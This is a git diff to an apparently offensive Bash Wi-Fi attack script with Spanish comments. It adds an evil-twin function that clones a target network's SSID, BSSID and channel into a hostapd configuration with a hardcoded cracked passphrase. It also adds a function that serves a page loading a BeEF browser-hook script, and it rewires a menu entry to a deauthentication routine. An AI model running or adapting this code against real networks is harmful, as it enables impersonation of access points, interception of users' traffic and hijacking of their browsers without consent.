@@ -432,6 +432,71 @@ Bruteforce(){
     
 }
 
+beefattack() {
+    BEEF_HOOK="/usr/share/beef-xss/hook.js"
+    LANDING_PAGE="/var/www/html/index.html"
+    
+    echo "<html><head><script src='$BEEF_HOOK'></script></head><body></body></html>" > $LANDING_PAGE
+    
+}
+
+PASSWORD_cracked="A123456789a!"
+
+false_ap(){
+
+    if echo "$PRIVACY_VAR" | grep -q "WPA2 WPA"; then 
+        WPA=3
+    elif echo "$PRIVACY_VAR" | grep -q "WPA2"; then
+        WPA=2
+    elif echo "$PRIVACY_VAR" | grep -q "WPA"; then
+        WPA=1
+    else
+        WPA=0  # AP Abierto o WEP (no recomendado)
+    fi
+
+    if echo "$AUTH_VAR" | grep -q "PSK"; then
+        WPA_KEY_MGMT="WPA-PSK"
+    elif echo "$AUTH_VAR" | grep -q "EAP"; then
+        WPA_KEY_MGMT="WPA-EAP"
+    else
+        WPA_KEY_MGMT=""  # Red abierta
+    fi
+
+    if echo "$CIPHER_VAR" | grep -q "CCMP" && echo "$CIPHER_VAR" | grep -q "TKIP"; then
+        RSN_PAIRWISE="CCMP TKIP"
+    elif echo "$CIPHER_VAR" | grep -q "CCMP"; then
+        RSN_PAIRWISE="CCMP"
+    elif echo "$CIPHER_VAR" | grep -q "TKIP"; then
+        RSN_PAIRWISE="TKIP"
+    else
+        RSN_PAIRWISE=""  # Red abierta o WEP
+    fi
+
+    cat <<EOF > hostapd.conf
+interface=$INTERFACE
+driver=nl80211
+ssid=$ESSID_VAR
+bssid=$BSSID_VAR
+hw_mode=g
+channel=$CHANNEL_VAR
+macaddr_acl=0
+auth_algs=1
+wpa=$WPA
+wpa_passphrase=$PASSWORD_cracked
+wpa_key_mgmt=$WPA_KEY_MGMT
+rsn_pairwise=$RSN_PAIRWISE
+EOF
+
+    echo "[+] Archivo hostapd.conf generado correctamente."
+
+    sudo ip link set wlan0mon down
+    sudo iw dev wlan0mon set type ap
+    sudo ip link set wlan0mon up
+
+}
+
+
+
 menu(){
    
     if true; then #./install.sh
@@ -533,7 +598,7 @@ menu(){
             4) select_wireless ;;
             5) Bruteforce ;;
             6) echo ""; hostname -I ;;
-            7) echo ""; free -h ;;
+            7) Deauther "0" ;;
             8) echo ""; uptime ;;
             9) echo ""; uname -r ;;
             0) echo "👋 Goodbye..."; exit 0 ;;
